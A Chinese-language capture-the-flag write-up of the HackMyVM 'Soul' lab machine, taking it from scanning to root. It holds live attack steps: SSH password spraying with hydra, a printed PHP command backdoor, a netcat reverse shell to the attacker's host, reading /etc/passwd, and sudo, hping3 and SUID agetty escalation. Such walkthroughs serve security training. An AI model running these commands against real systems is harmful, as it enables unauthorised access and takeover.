# Soul

:::note

[Linux VM] [Tested on VirtualBox] created by || sml

⏲️ Release Date // 2020-11-26

✔️ MD5 // 6248b98d48d47575c905dd8fc3361c6d

☠ Root // 49

💀 User // 49

📝Notes //
Hack and Fun. Tested on Virtualbox.

:::

## 靶机启动

靶机 IP

```plaintext
192.168.56.115
```

## nmap 信息搜集

```plaintext
Nmap scan report for 192.168.56.115
Host is up (0.00050s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey:
|   2048 8a:e9:c1:c2:a3:44:40:26:6f:22:37:c3:fe:a1:19:f2 (RSA)
|   256 4f:4a:d6:47:1a:87:7e:69:86:7f:5e:11:5c:4f:f1:48 (ECDSA)
|_  256 46:f4:2c:28:53:ef:4c:2b:70:f8:99:7e:39:64:ec:07 (ED25519)
80/tcp open  http    nginx 1.14.2
|_http-server-header: nginx/1.14.2
|_http-title: Site doesn't have a title (text/html).
```

## web 服务

尝试爆破

```plaintext
[22:07:32] 200 -   24B  - /index.html
[22:07:45] 200 -    9B  - /robots.txt
```

查看 `/robots.txt` 的数据

```plaintext
/nothing
```

尝试访问 `/`，是返回一张图片

```html
<img src="saint.jpg">
```

将图片下载下来进行分析

```bash
┌─[randark@parrot]─[~/tmp]
└──╼ $stegseek saint.jpg
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "pass.txt".
[i] Extracting to "saint.jpg.out".

┌─[randark@parrot]─[~/tmp]
└──╼ $cat saint.jpg.out
lionsarebigcats
```

尝试进行密码喷洒攻击

```bash
┌─[randark@parrot]─[~]
└──╼ $ hydra -I -v -V -L /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -p lionsarebigcats 192.168.56.115 ssh -t 4
......
[22][ssh] host: 192.168.56.115   login: daniel   password: lionsarebigcats
```

## User - daniel

```bash
┌─[✗]─[randark@parrot]─[~]
└──╼ $ ssh daniel@192.168.56.115
daniel@192.168.56.115's password:
Linux soul 4.19.0-12-amd64 #1 SMP Debian 4.19.152-1 (2020-10-18) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Feb 18 09:49:04 2024 from 192.168.56.102
daniel@soul:~$ whoami
daniel
```

经过探测，这里是受限 shell 环境，即为 `rbash`

```bash
daniel@soul:~$ echo $0
-rbash
```

### web 目录可控

```bash
┌─[randark@parrot]─[/usr/share/webshells/php]
└──╼ $ python-server 80
......
drwxr-xr-x 1 root root   64  1 月 22 日 03:13 findsocket
-rw-r--r-- 1 root root 2.8K 2021 年 11 月 21 日 php-backdoor.php
-rwxr-xr-x 1 root root 5.4K 2021 年 11 月 21 日 php-reverse-shell.php
-rw-r--r-- 1 root root  14K 2021 年 11 月 21 日 qsd-php-backdoor.php
-rw-r--r-- 1 root root  328 2021 年 11 月 21 日 simple-backdoor.php
......
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
192.168.56.115 - - [18/Feb/2024 23:30:13] "GET /simple-backdoor.php HTTP/1.1" 200 -

daniel@soul:~$ wget 192.168.56.102/simple-backdoor.php
daniel@soul:~$ mv simple-backdoor.php /var/www/html
```

文件成功上传，但是并没有被解析

```bash
┌─[randark@parrot]─[/usr/share/webshells/php]
└──╼ $ curl 192.168.56.115/simple-backdoor.php?cmd=cat+/etc/passwd
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd

<!--    http://michaeldaw.org   2006    -->
```

## 分析 nginx 配置

查看 nginx 的配置文件

```conf
user www-data;
worker_processes auto;
pid /run/nginx.pid;
include /etc/nginx/modules-enabled/*.conf;

events {
        worker_connections 768;
        # multi_accept on;
}

http {
        sendfile on;
        tcp_nopush on;
        tcp_nodelay on;
        keepalive_timeout 65;
        types_hash_max_size 2048;

        include /etc/nginx/mime.types;
        default_type application/octet-stream;

        ssl_protocols TLSv1 TLSv1.1 TLSv1.2; # Dropping SSLv3, ref: POODLE
        ssl_prefer_server_ciphers on;

        access_log /var/log/nginx/access.log;
        error_log /var/log/nginx/error.log;

        gzip on;

        include /etc/nginx/conf.d/*.conf;
        include /etc/nginx/sites-enabled/*;
}
```

可以在其中看到

```plaintext
include /etc/nginx/sites-enabled/*
```

并且并没有开启解析

查看有哪些文件

```bash
daniel@soul:~$ ls -lh /etc/nginx/sites-enabled/
total 0
lrwxrwxrwx 1 root root 34 Nov 26  2020 default -> /etc/nginx/sites-available/default
```

查看 `/etc/nginx/sites-enabled/default` 的配置数据

```conf
server {
        listen 80 default_server;
        listen [::]:80 default_server;

        root /var/www/html;

        # Add index.php to the list if you are using PHP
        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                # First attempt to serve request as file, then
                # as directory, then fall back to displaying a 404.
                try_files $uri $uri/ =404;
        }
}

server {
        listen 80;
        listen [::]:80;

        server_name lonelysoul.hmv;

        root /var/www/html;
        index index.html;

        location / {
                try_files $uri $uri/ =404;
        }

 # pass PHP scripts to FastCGI server
        #
               location ~ \.php$ {
               include snippets/fastcgi-php.conf;
        #
        #       # With php-fpm (or other unix sockets):
               fastcgi_pass unix:/run/php/php7.3-fpm.sock;
        #       # With php-cgi (or other tcp sockets):
        #       fastcgi_pass 127.0.0.1:9000;
        }
}
```

可以看到 `lonelysoul.hmv` 这个 domain 下的配置里面有 php 解析，加入 hosts 文件之后尝试访问

```plaintext title="/etc/hosts"
192.168.56.115 lonelysoul.hmv
```

然后尝试访问

```bash
┌─[randark@parrot]─[/usr/share/webshells/php]
└──╼ $ curl lonelysoul.hmv/simple-backdoor.php?cmd=whoami
<!-- Simple PHP backdoor by DK (http://michaeldaw.org) -->

<pre>www-data
</pre>
```

命令被成功执行

## User - www-data

```bash
# curl lonelysoul.hmv/simple-backdoor.php?cmd=nc+192.168.56.102+9999+-e+/bin/bash
┌─[randark@parrot]─[~]
└──╼ $ pwncat-cs -lp 9999
[10:07:14] Welcome to pwncat 🐈!
[10:07:41] received connection from 192.168.56.115:47562
[10:07:41] 192.168.56.115:47562: registered new host w/ db
(local) pwncat$ back
(remote) www-data@soul:/var/www/html$ whoami
www-data
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for www-data on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User www-data may run the following commands on soul:
    (gabriel) NOPASSWD: /tmp/whoami
```

### 尝试提权

部署恶意载荷

```bash
#!/bin/bash

whoami;

/bin/bash
```

## User - gabriel

```bash
(remote) www-data@soul:/tmp$ sudo -u gabriel /tmp/whoami
gabriel
gabriel@soul:/tmp$ whoami
gabriel
```

### flag - user

```bash
gabriel@soul:~$ cat user.txt
HMViwazhere
```

### 环境探测

```plaintext title="sudo -l"
Matching Defaults entries for gabriel on soul:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gabriel may run the following commands on soul:
    (peter) NOPASSWD: /usr/sbin/hping3
```

## User - peter

```bash
gabriel@soul:~$ sudo -u peter /usr/sbin/hping3
hping3> /bin/bash
peter@soul:/home/gabriel$ whoami
peter
```

### 环境探测

```plaintext title="sudo -l"
Permission denied
```

```plaintext title="getcap -r / 2>/dev/null"
/usr/bin/ping = cap_net_raw+ep
/usr/sbin/hping3 = cap_net_admin,cap_net_raw+eip
```

```plaintext title="find / -perm -u=s -type f 2>/dev/null"
/usr/bin/su
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/sbin/agetty
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
```

在其中，发现 `/usr/sbin/agetty` 具有 suid 权限，借此可以实现提权

## User - root

```bash
peter@soul:~$ /usr/sbin/agetty -o -p -l /bin/bash -a root tty

Debian GNU/Linux 10 soul tty

soul login: root (automatic login)

bash-5.0# whoami
root
```

### flag - root

```bash
bash-5.0# cat rootflag.txt
HMVohmygod
```
